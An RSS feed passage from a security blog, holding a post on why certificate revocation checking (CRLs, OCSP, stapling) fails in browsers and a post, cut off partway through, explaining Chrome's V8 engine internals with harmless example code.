<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>chmod +x singularity.sh</title><link>http://bt3gl.github.io/</link><description></description><atom:link href="http://bt3gl.github.io/feeds/web-security.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 03 Nov 2014 04:20:00 -0500</lastBuildDate><item><title>On CRLs, OCSP, and a Short Review of Why Revocation Checking Doesn't Work (for Browsers)</title><link>http://bt3gl.github.io/on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</link><description>&lt;p&gt;Today I am going to talk about some regulation details of &lt;strong&gt;SSL/TLS connections&lt;/strong&gt;. These connections rely on a chain of trust. This chain of trust is established by &lt;strong&gt;certificate authorities&lt;/strong&gt; (CAs), which serve as trust anchors to verify the validity of who a device thinks it is talking to. In technical terms, &lt;strong&gt;X.509&lt;/strong&gt; is an &lt;a href="http://en.wikipedia.org/wiki/ITU-T"&gt;ITU-T&lt;/a&gt; standard that specifies standard formats for things such as &lt;em&gt;public key certificates&lt;/em&gt; and &lt;em&gt;certificate revocation lists&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A &lt;strong&gt;public key certificate&lt;/strong&gt; is  how websites bind their identity to a &lt;em&gt;public key&lt;/em&gt; to allow  an encrypted session (SSL/TLS) with the user. The certificate includes information about the key, the owner's &lt;em&gt;identity&lt;/em&gt; (such as the DNS name), and the &lt;em&gt;digital signature&lt;/em&gt; of the entity that issued the certificate (the &lt;a href="http://en.wikipedia.org/wiki/Certificate_authority"&gt;Certificate Authority&lt;/a&gt;, also known as CA).  As a consequence, browsers and other &lt;a href="http://en.wikipedia.org/wiki/User_agent"&gt;user-agents&lt;/a&gt; should always be able to check the authenticity of these certificates before proceeding.&lt;/p&gt;
&lt;p&gt;Some organizations need SSL/TLS simply for confidentiality (encryption), while other organizations use it to enhance trust in their security and identity. Therefore, CAs issue different certificates with different levels of verification, ranging from just confirming the control of the domain name (&lt;em&gt;Domain Validation&lt;/em&gt;, DV) to more extensive identity checks (&lt;em&gt;Extended Validation&lt;/em&gt;, EV). For instance, if a site's DNS gets hijacked, while the attacker could be able to issue a controlled DV, she wouldn't be able to issue new EV certificates  just with domain validation.&lt;/p&gt;
&lt;p&gt;Since EV and DV certificates can be valid for years, they might lose their validity before they expire by age.  For instance, the website can lose control of its key or, as recently in the event of the &lt;a href="http://heartbleed.com/"&gt;Heartbleed bug&lt;/a&gt;, a very large number of SSL/TLS websites needed to revoke and reissue their certificates. Therefore, the need for an efficient revocation machinery is evident.&lt;/p&gt;
&lt;p&gt;For many years,  two ways of revoking a certificate have prevailed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;by checking a  &lt;strong&gt;Certificate Revocation Lists&lt;/strong&gt; (CRLs), which are lists of serial numbers of certificates that have been revoked, provided by &lt;em&gt;each CA&lt;/em&gt;. As one can imagine, they can become quite large.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;by a communication protocol named &lt;strong&gt;Online Certificate Status Protocol&lt;/strong&gt; (OCSP), which allows a system to check with a CA for the status of a single certificate without pulling the entire CRL.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While CRLs are long lists and OCSP only deals with a single certificate, they are both methods of getting signed statements about the status of a certificate; and they both present issues concerning privacy, integrity, and availability. In this post I discuss some of these issues and I review possible alternatives.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Broken Models&lt;/h2&gt;
&lt;h3&gt;Certificate Revocation Lists (CRLs)&lt;/h3&gt;
&lt;p&gt;A CRL is a list of  serial numbers (such as &lt;code&gt;54:99:05:bd:ca:2a:ad:e3:82:21:95:d6:aa:ee:b6:5a&lt;/code&gt;) of unexpired security certificates which have been revoked by their issuer and should not be trusted.&lt;/p&gt;
&lt;p&gt;Each CA maintains and publishes its own CRL. CRLs are in continuous changes: old certificates expire due to their age and serial numbers of newly revoked certificates are added.&lt;/p&gt;
&lt;p&gt;The main issue here is that the original &lt;em&gt;public key infrastructure&lt;/em&gt; (PKI) scheme does not scale. Users all over the Internet are constantly checking for  revocation and having to download files that can be many MB.  In addition, although CRL can be cached, they are still very volatile, turning CAs into a major performance bottleneck on the Internet.&lt;/p&gt;
&lt;h3&gt;Online Certificate Status Protocol (OCSP)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://tools.ietf.org/html/rfc2560"&gt;OCSP was intended to replace the CRL system&lt;/a&gt;, however it presented several issues:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Reliability&lt;/em&gt;: Every time any user connects to any secured website, her  browser must query the CA's OCSP server. The typical CA issues certificates for hundreds of thousands of individual websites and the checks can be  up to  seconds.  Also, the CA's OCSP server might experience downtime! If a server is offline, overloaded, under attack, or unable to reply for any reason, certificate validity cannot be confirmed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Privacy&lt;/em&gt;: CAs can learn the IP address of users and which websites they wish to securely visit.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Security&lt;/em&gt;: Browsers can not be sure that a CA's server is reachable (&lt;em&gt;e.g.&lt;/em&gt;, captive portals that require one to sign in on a HTTPS site, but blocks traffic to all other sites, including CA's OCSP servers).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One attempt to circumvent the lack of assurance of a server's reliability was issuing OCSP checks with a &lt;strong&gt;soft-fail&lt;/strong&gt; option. In this case, online revocation checks which result in a &lt;em&gt;network error would be ignored&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This brings serious issues. A simple example is when an &lt;a href="http://www.thoughtcrime.org/papers/ocsp-attack.pdf"&gt;attacker can intercept HTTPS traffic and make online revocation checks appear to fail, bypassing OCSP checks&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On the flip side, it's also not a good idea to enforce a &lt;strong&gt;hard-fail&lt;/strong&gt; check:  OCSP servers are pretty flaky/slow and you do not want to relay on their capabilities (DDoS attackers would love this though).&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Some Light in a Solution&lt;/h2&gt;
&lt;p&gt;There are several attempts of a solution for the revocation problem but none of them has been regarded as the definitive one. Here some of them:&lt;/p&gt;
&lt;h3&gt;CRLSets&lt;/h3&gt;
&lt;p&gt;Google Chrome uses &lt;a href="https://dev.chromium.org/Home/chromium-security/crlsets"&gt;&lt;strong&gt;CRLSets&lt;/strong&gt;&lt;/a&gt; int its update mechanism to send lists of serial numbers of revoked certificates which are constantly added by crawling the CAs.&lt;/p&gt;
&lt;p&gt;This method brings  more performance and reliability to the browser and, in addition, &lt;a href="https://www.imperialviolet.org/2014/04/19/revchecking.html"&gt;CRLSet updates occur at least daily&lt;/a&gt;, which is faster than most OCSP validity periods.&lt;/p&gt;
&lt;p&gt;A complementary initiative from Google is the  &lt;a href="http://www.certificate-transparency.org/what-is-ct"&gt;Certificate Transparency&lt;/a&gt; project. The objective is to help with  structural flaws in the SSL certificate system such as domain validation, end-to-end encryption, and the chains of trust set up by CAs.&lt;/p&gt;
&lt;h3&gt;OCSP stapling&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;OCSP Stapling&lt;/strong&gt; (&lt;a href="http://tools.ietf.org/html/draft-hallambaker-tlssecuritypolicy-03"&gt;TLS Certificate Status Request extension&lt;/a&gt;) is an alternative approach for checking the revocation status of certificates. It allows the presenter of a certificate to bear the resource cost involved in providing OCSP responses, instead of the CA, in a fashion reminiscent of the &lt;a href="http://en.wikipedia.org/wiki/Kerberos_(protocol)"&gt;Kerberos Ticket&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In a simple example, the certificate holder is the one who periodically queries the OCSP server, obtaining a &lt;em&gt;signed time-stamped OCSP response&lt;/em&gt;. When users attempt to connect to the website, the response is signed with the SSL/TLS handshake via the Certificate Status Request extension response. Since the stapled response is signed by the CA, it cannot be forged (without the CA's signing key).&lt;/p&gt;
&lt;p&gt;If the stapled OCSP has the &lt;a href="http://tools.ietf.org/html/draft-hallambaker-muststaple-00"&gt;Must Staple&lt;/a&gt; capability, it becomes hard-fail if a valid OCSP response is not stapled. To make a browser know this option, one can add a "must staple" assertion to the site's security certificate and/or create a new HTTP response header similar to &lt;a href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"&gt;HSTS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Some fixable issue is that OCSP stapling supports only one response at a time. This is insufficient for sites that use several different certificates for a single page. Nevertheless, OCSP stapling is the most promising solution for the problem for now. The idea has been implemented by the servers for years, and recently, a &lt;a href="https://blog.mozilla.org/security/2013/07/29/ocsp-stapling-in-firefox/"&gt;few browsers are adopting it&lt;/a&gt;. If this solution is going to become mainstream, only time will show.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; The security of the Internet depends on the agent's ability to revoke compromised certificates, but the status quo is broken. There is  a urgent  need for rethinking the way things have been done!&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Edited, 11/19/2014:&lt;/strong&gt; The &lt;strong&gt;EFF&lt;/strong&gt; just announced an attempt to help the CA  problem:  &lt;a href="https://www.eff.org/deeplinks/2014/11/certificate-authority-encrypt-entire-web"&gt;Let's Encrypt&lt;/a&gt;, "a new certificate authority (CA) initiative that aims to clear the remaining roadblocks to transition the Web from HTTP to HTTPS". The initiative is planned to be released in 2015. These are good news, but it is still not clear whether they are going to address the revocation problem with new solutions.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;References:&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.imperialviolet.org/2011/03/18/revocation.html"&gt;Imperial Violet: Revocation Doesn't work&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.imperialviolet.org/2014/04/19/revchecking.html"&gt;Imperial Violet: Don't Enable Revocation Checking&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.imperialviolet.org/2014/04/29/revocationagain.html"&gt;Imperial Violet: Revocation Still Doesn't Work&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/agl/876829"&gt;Proxy server for testing revocation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.imperialviolet.org/2012/02/05/crlsets.html"&gt;Revocation checking and Chrome's CRL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://code.google.com/p/chromium/issues/detail?id=361820"&gt;Discussion about OCSP checking at Chrome&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://tools.ietf.org/html/draft-balfanz-tls-channelid-00"&gt;RFC Transport Layer Security (TLS) Channel IDs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.isecpartners.com/media/17919/revocation-whitepaper_pdf__2_.pdf"&gt;Fixing Revocation for Web Browsers, iSEC Partners&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://wiki.mozilla.org/images/e/e3/SSLcertRevocation.pdf"&gt;Proposal for Better Revocation Model of SSL Certificates&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.ssllabs.com/ssltest/"&gt;SSL Server Test&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.digicert.com/help/"&gt;SSL Certificate Checker&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Marina von Steinkirch</dc:creator><pubDate>Mon, 03 Nov 2014 04:20:00 -0500</pubDate><guid>tag:bt3gl.github.io,2014-11-03:on-crls-ocsp-and-a-short-review-of-why-revocation-checking-doesnt-work-for-browsers.html</guid><category>CRL</category><category>CRLSets</category><category>OCSP</category><category>TLS</category><category>Chrome</category></item><item><title>A Closer Look at Chrome's Security: Understanding V8</title><link>http://bt3gl.github.io/a-closer-look-at-chromes-security-understanding-v8.html</link><description>&lt;p&gt;&lt;a href="http://blogoscoped.com/google-chrome/"&gt;In 2008, Google released a sandbox-oriented browser&lt;/a&gt;, that was assembled from several different code libraries from Google and third parties (for instance, it borrowed a rendering machinery from the open-source  &lt;a href="https://www.webkit.org/"&gt;Webkit layout engine&lt;/a&gt;, later changing it to a forked version, &lt;a href="http://en.wikipedia.org/wiki/Blink_(layout_engine)"&gt;Blink&lt;/a&gt;).  Six years later, Chrome has became the preferred browser for &lt;a href="http://en.wikipedia.org/wiki/File:Usage_share_of_web_browsers_(Source_StatCounter).svg"&gt;half of users in the Internet&lt;/a&gt;. This is enough reason to investigate further how security is dealt in this engine. With this motivation in mind, I summarize the main features of Chrome and its &lt;a href="http://www.chromium.org/Home"&gt;Chromium Project&lt;/a&gt;, describing the pristine way of processing JavaScript with the &lt;strong&gt;V8 JavaScript virtual machine&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;They way computers talk...&lt;/h2&gt;
&lt;p&gt;In mainstream computer languages, a &lt;a href="http://www.openbookproject.net/thinkcs/python/english2e/ch01.html"&gt;source code in a &lt;strong&gt;high level language&lt;/strong&gt; is transformed to a &lt;strong&gt;low level language&lt;/strong&gt;&lt;/a&gt; (a machine or assembly language)  by either being &lt;strong&gt;compiled&lt;/strong&gt; or &lt;strong&gt;interpreted&lt;/strong&gt; . This is &lt;a href="https://www.youtube.com/watch?v=_C5AHaS1mOA"&gt;a very simple concept&lt;/a&gt; but it is a fundamental one!&lt;/p&gt;
&lt;h3&gt;Compilers and Interpreters&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Compilers&lt;/strong&gt;  produce  an intermediate form called &lt;strong&gt;code object&lt;/strong&gt;, which is like machine code but augmented with symbols tables  to make executable blocks (library files, with file objects). A linker is used to finally combine them to form executables.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Interpreters&lt;/strong&gt; execute instructions without compiling into machine language first. They are first translated into a lower level intermediate representations such as &lt;strong&gt;byte code&lt;/strong&gt; or &lt;strong&gt;abstract syntax trees&lt;/strong&gt; (ASTs). Then they are interpreted by a  &lt;strong&gt;virtual machine&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The truth is that things are generally mixed.  For example, when you type some instruction in  Python's REPL, &lt;a href="http://akaptur.com/blog/2013/11/17/introduction-to-the-python-interpreter-3/"&gt;the language executes four steps&lt;/a&gt;: &lt;em&gt;lexing&lt;/em&gt; (breaks the code into pieces), &lt;em&gt;parsing&lt;/em&gt; (generates an AST with those pieces - it is the syntax analysis), &lt;em&gt;compiling&lt;/em&gt; (converts the AST into code objects - which are attributes of the function objects), and &lt;em&gt;interpreting&lt;/em&gt; (executes the code objects).&lt;/p&gt;
&lt;p&gt;In Python, byte-compiled code, in form of &lt;strong&gt;.pyc&lt;/strong&gt; files, is used by the compiler to speed-up the start-up time (load time) for short programs that use a lot of standard modules. And, by the way, byte codes are attributes of the code object so to see them, you just need to call &lt;code&gt;func_code&lt;/code&gt; (code object) and &lt;code&gt;co_code&lt;/code&gt;(bytecode)[1]:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;some_function&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;     &lt;span class="k"&gt;return&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;some_function&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;co_code&lt;/span&gt;
&lt;span class="s"&gt;&amp;#39;d&lt;/span&gt;&lt;span class="se"&gt;\x00\x00&lt;/span&gt;&lt;span class="s"&gt;S&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;On the other hand, traditional JavaScript code is represented as a bytecode or an AST, and then executed in a &lt;em&gt;virtual machine&lt;/em&gt; or further compiled into machine code. When JavaScript interprets code, it executes roughly the following steps: &lt;em&gt;parsing&lt;/em&gt; and &lt;em&gt;preprocessing&lt;/em&gt;, &lt;em&gt;scope analysis&lt;/em&gt;, and &lt;em&gt;bytecode or translation to native&lt;/em&gt;. Just a note: the JavaScript engine represents bytecode using &lt;a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Internals/Bytecode"&gt;SpiderMonkey&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So we see that when modern languages choose the way they compile or interpret code, they are trading off with the speed they want things to run. Since browsers are preoccupied with delivering content the faster they can,  this is a fundamental concept.&lt;/p&gt;
&lt;h3&gt;Method JITs and Tracing JITs&lt;/h3&gt;
&lt;p&gt;To speed things up, instead of having the code being parsed and then executed (&lt;a href="http://en.wikipedia.org/wiki/Ahead-of-time_compilation"&gt;one at time&lt;/a&gt;),  &lt;strong&gt;dynamic translators&lt;/strong&gt;  (&lt;em&gt;Just-in-time&lt;/em&gt; translators, or JIT) can be used. JITs &lt;em&gt;translate intermediate representation into machine language  at runtime&lt;/em&gt;. They have the efficiency of running native code with the cost of startup time plus increased memory (when the bytecode or AST are first compiled).&lt;/p&gt;
&lt;p&gt;Engines have different policies on code generation, which can roughly be grouped into types: &lt;strong&gt;tracing&lt;/strong&gt; and &lt;strong&gt;method&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Method JITs&lt;/strong&gt; emit native code for every block (method) of code and update references dynamically. Method JITs can implement an &lt;em&gt;inline cache&lt;/em&gt; for rewriting type lookups at runtime.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;tracing JITs&lt;/strong&gt;, native code is only emitted when a certain block (method) is considered &lt;em&gt;important&lt;/em&gt;. An example is given by traditional JavaScript: if you load a script with functions that are never used, they are never compiled. Additionally, in JavaScript a  &lt;em&gt;cache&lt;/em&gt; is usually implemented due to the nature of its &lt;em&gt;dynamic typing system&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;As we will see below, V8 performs direct JIT compilation from  (JavaScript) source code to native machine code (IA-32, x86-64, ARM, or MIPS ISAs),  &lt;strong&gt;without transforming it to bytecode first&lt;/strong&gt;. In addition, V8 performs  dynamic several optimizations at runtime (including &lt;strong&gt;inline caching&lt;/strong&gt;). But let's not get ahead of ourselves! Also,  as a note, Google has implemented a technology called &lt;a href="http://code.google.com/p/nativeclient/"&gt;&lt;strong&gt;Native Client&lt;/strong&gt;&lt;/a&gt; (NaCl), which  allows one to provide compiled code to the  Chrome browser.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;The way JavaScript rolls...&lt;/h2&gt;
&lt;p&gt;JavaScript's integration with &lt;a href="http://en.wikipedia.org/wiki/Netscape_Navigator"&gt;Netscape Navigator&lt;/a&gt; in the mid-90s made it easier for developers to access HTML page elements such as &lt;em&gt;forms&lt;/em&gt;, &lt;em&gt;frames&lt;/em&gt;, and &lt;em&gt;images&lt;/em&gt;. This was essential for JavaScript's accession to become the most popular scripting engine for the web.&lt;/p&gt;
&lt;p&gt;However, the language's high dynamical behavior (that I'm briefly discussing here) came with a price: in the mid-2000s browsers had very slow  implementations that did not scale with code size or &lt;em&gt;object allocation&lt;/em&gt;. Issues such as &lt;em&gt;memory leaks&lt;/em&gt; when running web apps were becoming mainstream. It was clear that things would only get worse and a new JavaScript engine was a need.&lt;/p&gt;
&lt;h3&gt;JavaScript's Structure&lt;/h3&gt;
&lt;p&gt;In JavaScript, every object has a &lt;em&gt;prototype&lt;/em&gt;, and the prototype is also an object. All JavaScript objects inherit their properties and methods from their prototype.&lt;/p&gt;
&lt;p&gt;So, for example, supposing an application that has an object &lt;em&gt;Point&lt;/em&gt; (borrowed from the &lt;a href="https://developers.google.com/v8/design"&gt;official documentation&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can create several objects:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we can access the propriety &lt;code&gt;x&lt;/code&gt; in these object by:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the above implementation, we would have two different Point objects that do not share any structure. This is because JavaScript is &lt;strong&gt;classless&lt;/strong&gt;: you create  new objects on the fly and dynamically add or remove proprieties. Functions can move from an object to another. Objects with same type can appear in the same sites in the program with no constraints.&lt;/p&gt;
&lt;p&gt;Furthermore, to store their object proprieties, most JavaScript engines use a &lt;em&gt;dictionary-like data structure&lt;/em&gt;. Each property access demands a dynamic lookup to resolve their location in memory. This contrasts  &lt;em&gt;static&lt;/em&gt; languages such as Java, where instance variables are located at fixed offsets determined by the compiler (due to the &lt;em&gt;fixed&lt;/em&gt; object layout by the &lt;em&gt;object's class&lt;/em&gt;). In this case, access is given by a simple memory load or store (a single instruction).&lt;/p&gt;
&lt;h3&gt;JavaScript's Garbage Collection&lt;/h3&gt;
&lt;p&gt;Garbage collection is a form of &lt;em&gt;automatic memory management&lt;/em&gt;: an attempt to reclaim the memory occupied by objects that are not being used any longer (&lt;em&gt;i.e.&lt;/em&gt;, if an object loses its reference, the object's memory has to be reclaimed).&lt;/p&gt;
&lt;p&gt;The other possibility is &lt;em&gt;manual memory management&lt;/em&gt;, which requires the developer to specify which objects need to be deallocated. However, manual garbage collection can result in bugs such as:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Dangling pointers&lt;/strong&gt;: when a piece of memory is freed while there are still pointers to it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Double free bugs&lt;/strong&gt;: when the program tries to free a region of memory that it had already freed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Memory leaks&lt;/strong&gt;: when the program fails to free memory occupied by an object that had became unreachable, leading to memory exhaustion.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;As one could guess, JavaScript has automatic memory management. Actually, the core design flaw of traditional JavaScript engines is &lt;strong&gt;bad garbage collection behavior&lt;/strong&gt;. The problem is that JavaScript engines do not know exactly where all the pointers are, and they will search through the entire execution stack to see what data looks like pointers (for instance, integers can look like a pointer to an address in the heap).&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Introducing V8&lt;/h2&gt;
&lt;p&gt;A solution for the issues presented above came from Google,  with  the &lt;strong&gt;V8 Engine&lt;/strong&gt;. V8 is an &lt;a href="https://code.google.com/p/v8/"&gt;open source JavaScript engine&lt;/a&gt; written in C++ that gave birth to Chrome. V8 has a way to categorize the highly-dynamic JavaScript objects into classes, bringing techniques from static class-based languages. In addition, as I mentioned in the the beginning, V8 compiles JavaScript to native machine code before executing it.&lt;/p&gt;
&lt;p&gt;In terms of performance, besides direct compilation to native code, three main features in V8 are fundamental:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Hidden&lt;/span&gt; &lt;span class="n"&gt;classes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;

&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;In&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="n"&gt;caching&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;optimization&lt;/span&gt; &lt;span class="n"&gt;technique&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;

&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;Efficient&lt;/span&gt; &lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;system&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;garbage&lt;/span&gt; &lt;span class="n"&gt;collection&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's take a look at each of them.&lt;/p&gt;
&lt;h3&gt;V8's Hidden Class&lt;/h3&gt;
&lt;p&gt;In V8, as execution goes on, objects that end up with the same properties will share the same &lt;strong&gt;hidden class&lt;/strong&gt;. This way the engine  applies dynamic optimizations.&lt;/p&gt;
&lt;p&gt;Consider the Point example from before: we have two different objects, &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt;. Instead of having them completely independent, V8 makes them share a hidden class. So instead of creating two objects, we have &lt;em&gt;three&lt;/em&gt;. The hidden class shows that both objects have the same proprieties and an object changes its hidden class when a new property is added.&lt;/p&gt;
&lt;p&gt;So, for our example, if another Point object is created:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Initially the Point object has no properties so the newly created object refers to the initial class &lt;strong&gt;C0&lt;/strong&gt;. The value is stored at offset zero of  the Point object.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;When property &lt;code&gt;x&lt;/code&gt; is added, V8 follows the hidden class transition from &lt;strong&gt;C0&lt;/strong&gt; to &lt;strong&gt;C1&lt;/strong&gt; and writes the value of &lt;code&gt;x&lt;/code&gt; at the offset specified by &lt;strong&gt;C1&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;When property &lt;code&gt;y&lt;/code&gt; is added, V8 follows the hidden class transition from &lt;strong&gt;C1&lt;/strong&gt; to &lt;strong&gt;C2&lt;/strong&gt; and writes the value of &lt;code&gt;y&lt;/code&gt; at the offset specified by &lt;strong&gt;C2&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Instead of having a generic lookup for a propriety, V8  generates an efficient machine code to search the propriety. The machine code generated for accessing &lt;code&gt;x&lt;/code&gt; is something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;# ebx = the point object&lt;/span&gt;
&lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;class&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;cached&lt;/span&gt; &lt;span class="n"&gt;class&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
